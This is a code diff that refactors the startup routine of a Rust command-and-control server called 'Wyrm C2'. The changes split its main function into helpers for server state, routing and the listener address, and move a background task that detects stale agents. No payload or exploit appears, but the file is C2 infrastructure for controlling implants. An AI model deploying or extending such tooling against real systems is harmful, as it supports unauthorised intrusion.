@@ -64,9 +64,46 @@ const ERROR_LOG: &str = "error.log";
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    //
+    // Initialise the state of the C2, including checking the filesystem, database, etc.
+    //
+    let state = init_server_state().await;
+
+    //
+    // Build the router and serve content
+    //
+    let app = build_routes(state.clone());
+    let listener = tokio::net::TcpListener::bind(construct_listener_addr()).await?;
+
+    print_success(format!(
+        "Wyrm C2 started on: {}",
+        listener.local_addr().unwrap()
+    ));
+
+    serve(
+        listener,
+        app.into_make_service_with_connect_info::<SocketAddr>(),
+    )
+    .await?;
+
+    print_info("Server closed.");
+
+    Ok(())
+}
+
+fn construct_listener_addr() -> String {
+    let port = std::env::var("C2_PORT").expect("could not find C2_PORT environment variable");
+    let port: u16 = port
+        .parse()
+        .expect("could not parse port number to valid range");
+    let c2_host = std::env::var("C2_HOST").expect("could not find C2_HOST environment variable");
+
+    format!("{c2_host}:{port}")
+}
+
+async fn init_server_state() -> Arc<AppState> {
     print_info("Starting Wyrm C2.");
 
-    // if this fails, panic is ok
     let profile = match parse_profiles().await {
         Ok(p) => p,
         Err(e) => {
@@ -76,21 +113,26 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     print_info("Profiles parsed.");
 
-    // Set a panic hook for logging unwraps, expects, panics, etc.
     set_panic_hook();
-
-    // Build any paths on disk we need
     ensure_dirs_and_files();
-
-    print_info("Directories and files checked.");
 
     let pool = Db::new().await;
     let state = Arc::new(AppState::from(pool, profile).await);
-    state.track_sessions();
 
+    //
+    // Kick off automations that run on the server
+    //
+    state.track_sessions();
+    let state_cl = state.clone();
+    tokio::task::spawn(async move { detect_stale_agents(state_cl).await });
+
+    state
+}
+
+fn build_routes(state: Arc<AppState>) -> Router {
     print_info("Building Router...");
 
-    let app = Router::new()
+    Router::new()
         //
         // PUBLIC ROUTES
         //
@@ -155,32 +197,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         // 1 GB for POST max ?
         //
         .layer(DefaultBodyLimit::max(MAX_POST_BODY_SZ))
-        .with_state(state.clone());
-
-    tokio::task::spawn(async move { detect_stale_agents(state.clone()).await });
-
-    let port = std::env::var("C2_PORT").expect("could not find C2_PORT environment variable");
-    let port: u16 = port
-        .parse()
-        .expect("could not parse port number to valid range");
-    let c2_host = std::env::var("C2_HOST").expect("could not find C2_HOST environment variable");
-
-    let listener = tokio::net::TcpListener::bind(&format!("{c2_host}:{port}")).await?;
-
-    print_success(format!(
-        "Wyrm C2 started on: {}",
-        listener.local_addr().unwrap()
-    ));
-
-    serve(
-        listener,
-        app.into_make_service_with_connect_info::<SocketAddr>(),
-    )
-    .await?;
-
-    print_info("Server closed.");
-
-    Ok(())
+        .with_state(state.clone())
 }
 
 fn ensure_dirs_and_files() {
@@ -251,6 +268,8 @@ fn ensure_dirs_and_files() {
             }
         }
     }
+
+    print_info("Directories and files checked.");
 }
 
 fn set_panic_hook() {
